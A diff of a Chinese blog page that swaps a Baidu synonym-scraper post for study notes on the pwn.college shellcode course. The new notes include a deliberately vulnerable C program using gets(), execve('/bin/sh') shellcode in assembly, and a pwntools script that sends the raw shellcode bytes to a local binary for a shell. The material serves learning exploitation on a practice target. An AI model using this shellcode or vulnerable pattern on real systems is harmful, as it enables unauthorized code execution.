@@ -16,24 +16,24 @@
   <meta name="author" content="Hush">
   <meta name="keywords" content="">
   
-    <meta name="description" content="依旧采用的正则表达式匹配">
+    <meta name="description" content="课程链接 漏洞程序 hello.c12345678910111213void bye1()&amp;#123; puts(&quot;Goodbye!&quot;); &amp;#125;void bye2()&amp;#123; puts(&quot;Farewell!&quot;); &amp;#125;void hello(char * name ,void (* bye_func)())&amp;#123; 	printf(&amp;q">
 <meta property="og:type" content="article">
-<meta property="og:title" content="爬虫抓取指定词语百度图片">
-<meta property="og:url" content="https://hushs1gnal.github.io/2022/05/24/cikucrawler/index.html">
+<meta property="og:title" content="PwnCollege_shellcode第一章">
+<meta property="og:url" content="https://hushs1gnal.github.io/2022/05/17/Pwncollege_shellocode_1/index.html">
 <meta property="og:site_name" content="Hush&#39;blog">
-<meta property="og:description" content="依旧采用的正则表达式匹配">
+<meta property="og:description" content="课程链接 漏洞程序 hello.c12345678910111213void bye1()&amp;#123; puts(&quot;Goodbye!&quot;); &amp;#125;void bye2()&amp;#123; puts(&quot;Farewell!&quot;); &amp;#125;void hello(char * name ,void (* bye_func)())&amp;#123; 	printf(&amp;q">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hushs1gnal.github.io/img/hello4.jpg">
-<meta property="article:published_time" content="2022-05-24T04:29:26.616Z">
-<meta property="article:modified_time" content="2022-05-24T04:33:46.756Z">
+<meta property="og:image" content="https://hushs1gnal.github.io/img/hello7.jpg">
+<meta property="article:published_time" content="2022-05-17T06:49:28.000Z">
+<meta property="article:modified_time" content="2022-05-24T05:53:21.847Z">
 <meta property="article:author" content="Hush">
-<meta property="article:tag" content="爬虫">
+<meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello4.jpg">
+<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello7.jpg">
   
   
   
-  <title>爬虫抓取指定词语百度图片 - Hush&#39;blog</title>
+  <title>PwnCollege_shellcode第一章 - Hush&#39;blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -184,7 +184,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="爬虫抓取指定词语百度图片"></span>
+            <span id="subtitle" data-typed-text="PwnCollege_shellcode第一章"></span>
           
         </div>
 
@@ -195,8 +195,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-05-24 12:29" pubdate>
-          2022年5月24日 中午
+        <time datetime="2022-05-17 14:49" pubdate>
+          2022年5月17日 下午
         </time>
       </span>
     
@@ -207,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          1.1k 字
         
       </span>
     
@@ -247,19 +247,30 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">爬虫抓取指定词语百度图片</h1>
+            <h1 style="display: none">PwnCollege_shellcode第一章</h1>
             
             <div class="markdown-body">
               
-              <p>爬虫下来的词语会写在同级文件夹下的txt文件</p>
-<p>代码演示的是爬取无聊的同义词</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pa</span>(<span class="hljs-params">ci</span>):<br>    datalist=[]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(ci+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>      datalist=f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(datalist)):<br>        datalist[i]=datalist[i].strip()<br>    <span class="hljs-built_in">print</span>(datalist)<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> datalist:<br>     time.sleep(<span class="hljs-number">0.1</span>)<br>     <span class="hljs-built_in">print</span>(data+<span class="hljs-string">&quot;的近义词&quot;</span>)<br>     url=<span class="hljs-string">&quot;https://hanyu.baidu.com/s&quot;</span><br>     param=&#123;<br>        <span class="hljs-string">&quot;wd&quot;</span>:data.encode(),<br>        <span class="hljs-string">&quot;ptype&quot;</span>:<span class="hljs-string">&quot;zici&quot;</span>,<br>     &#125;<br>     headers=&#123;<br>       <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span>,<br>     &#125;<br>     resp=requests.get(url,params=param,headers=headers)  <span class="hljs-comment">#verify = Flase 去掉安全验证</span><br>     page_content=resp.text<br>     index1=page_content.find(<span class="hljs-string">&quot;&lt;label&gt;近义词 &lt;/label&gt;&quot;</span>)<br>     page_content=page_content[index1:]<br>     index2=page_content.find(<span class="hljs-string">&quot;&lt;label&gt;反义词 &lt;/label&gt; &quot;</span>)<br>     page_content=page_content[:index2]<br>     index3=page_content.find(<span class="hljs-string">&quot;&lt;h1&gt;热搜字词&lt;/h1&gt;&quot;</span>)<br>     page_content=page_content[:index3]<br>     obj=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;a href=.*?&gt;(?P&lt;word1&gt;.*?)&lt;/a&gt;&quot;</span>,re.S)<br>     result=obj.finditer(page_content)<br>     <span class="hljs-keyword">for</span> it <span class="hljs-keyword">in</span> result:<br>       f=<span class="hljs-built_in">open</span>(ci+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>       <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;百科&quot;</span><span class="hljs-keyword">in</span> it.group(<span class="hljs-string">&quot;word1&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;百度&quot;</span> <span class="hljs-keyword">in</span> it.group(<span class="hljs-string">&quot;word1&quot;</span>)):<br>           <span class="hljs-keyword">break</span><br>       <span class="hljs-keyword">if</span>(it.group(<span class="hljs-string">&quot;word1&quot;</span>)<span class="hljs-keyword">in</span> datalist):<br>           <span class="hljs-keyword">break</span><br>       f.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>       f.write(it.group(<span class="hljs-string">&quot;word1&quot;</span>))<br>       f.close()<br><br>pa(<span class="hljs-string">&quot;无聊&quot;</span>)<br></code></pre></td></tr></table></figure>
+              <p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=715v_-YnpT8">课程链接</a></p>
+<h1 id="漏洞程序-hello-c"><a href="#漏洞程序-hello-c" class="headerlink" title="漏洞程序 hello.c"></a>漏洞程序 hello.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bye1</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bye2</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Farewell!&quot;</span>); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-type">char</span> * name ,<span class="hljs-type">void</span> (* bye_func)())</span>&#123;<br> 	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello , %s\n&quot;</span>,name);<br>	bye_func();<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span>&#123;<br>	<span class="hljs-type">char</span> name[<span class="hljs-number">1024</span>];<br>	gets(name);<br>	srand(time(<span class="hljs-number">0</span>));<br>	<span class="hljs-keyword">if</span>(rand()%<span class="hljs-number">2</span>) hello(bye1,name);<br> 	<span class="hljs-keyword">else</span> hello(name,bye2);<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>如果需要更多的同义词， 反复运气3-5次程序即可。</p>
-<p>因为百度汉语给出的同义词并不是我们意义上的同义词。</p>
-<p>例如 “生气”的同义词我们会想到“愤怒”</p>
-<p>但是在百度汉语中“生气”会作为“生气勃勃” 的意思，进而会给出“活泼” 的近义词。</p>
-<p>所以仍然需要对抓取下来的词库进行第二次处理。</p>
+<p>GCC编译，1&#x2F;2的概率程序崩溃</p>
+<p><img src="/img/pwncollege-1.png" srcset="/img/loading.gif" lazyload alt="pwncollege-1"></p>
+<h1 id="shellcode-s"><a href="#shellcode-s" class="headerlink" title="shellcode.s"></a>shellcode.s</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start           #.global定义一个全局符号 _start 为程序的入口<br>_start:                  # _start: 标志程序入口<br>.intel_syntax noprefix   #intel代码格式<br>  	mov rax, 59          #系统调用号  <br>	lea rdi, [rip+binsh] #binsh偏移<br>	mov rsi, 0<br>	mov rdx, 0<br>	syscall<br>binsh:                  #binsh标号<br>	.string &quot;/bin/sh&quot;   #.string 标志string类型<br></code></pre></td></tr></table></figure>
+
+<p>编译运行</p>
+<p><img src="/img/pwncollege-2.png" srcset="/img/loading.gif" lazyload alt="pwncollege-2"></p>
+<p>objdump 看一下section</p>
+<p><img src="/img/pwncollege-3.png" srcset="/img/loading.gif" lazyload alt="pwncollege-3"></p>
+<p> 其实到这里对于shellcode已经是可以使用了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./hello&#x27;</span>)<br>payload=<span class="hljs-string">&quot;\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/pwncollege-4.png" srcset="/img/loading.gif" lazyload alt="pwncollege-4"></p>
+<p>视频中演示了另一种方法，利用objcpoy 将代码段部分转移到shellcode-raw文件中</p>
+<p><img src="/img/pwncollege-6.png" srcset="/img/loading.gif" lazyload alt="pwncollege-6"></p>
+<p>（hd &#x3D;hexdump）用十六进制把二进制文件打印出来</p>
+<p><img src="/img/pwncollege-5.png" srcset="/img/loading.gif" lazyload alt="pwncollege-5"></p>
+<p> 利用管道符（这行指令还没太看明白，但是用的应该不多，不去深究了）</p>
 
               
             </div>
@@ -277,12 +288,12 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%88%AC%E8%99%AB/" class="category-chain-item">爬虫</a>
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
   
   
     <span>></span>
     
-  <a href="/categories/%E7%88%AC%E8%99%AB/%E7%99%BE%E5%BA%A6%E6%B1%89%E8%AF%AD/" class="category-chain-item">百度汉语</a>
+  <a href="/categories/Pwn/base/" class="category-chain-item">base</a>
   
   
 
@@ -299,7 +310,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E7%88%AC%E8%99%AB/">#爬虫</a>
+        <a href="/tags/Pwn/">#Pwn</a>
       
     </div>
   
@@ -311,8 +322,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>爬虫抓取指定词语百度图片</div>
-      <div>https://hushs1gnal.github.io/2022/05/24/cikucrawler/</div>
+      <div>PwnCollege_shellcode第一章</div>
+      <div>https://hushs1gnal.github.io/2022/05/17/Pwncollege_shellocode_1/</div>
     </div>
     <div class="license-meta">
       
@@ -324,7 +335,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年5月24日</div>
+          <div>2022年5月17日</div>
         </div>
       
       
@@ -354,7 +365,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/05/24/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/" title="kernel_ROP-2018_强网杯-core">
+                      <a href="/2022/05/19/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/" title="kernel_ROP-2018_强网杯-core">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">kernel_ROP-2018_强网杯-core</span>
                         <span class="visible-mobile">上一篇</span>
@@ -364,8 +375,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/05/24/BDtpCrawler/" title="爬虫抓取指定词语百度图片">
-                        <span class="hidden-mobile">爬虫抓取指定词语百度图片</span>
+                      <a href="/2022/04/30/BDtpCrawler/" title="爬虫抓取百度图片">
+                        <span class="hidden-mobile">爬虫抓取百度图片</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
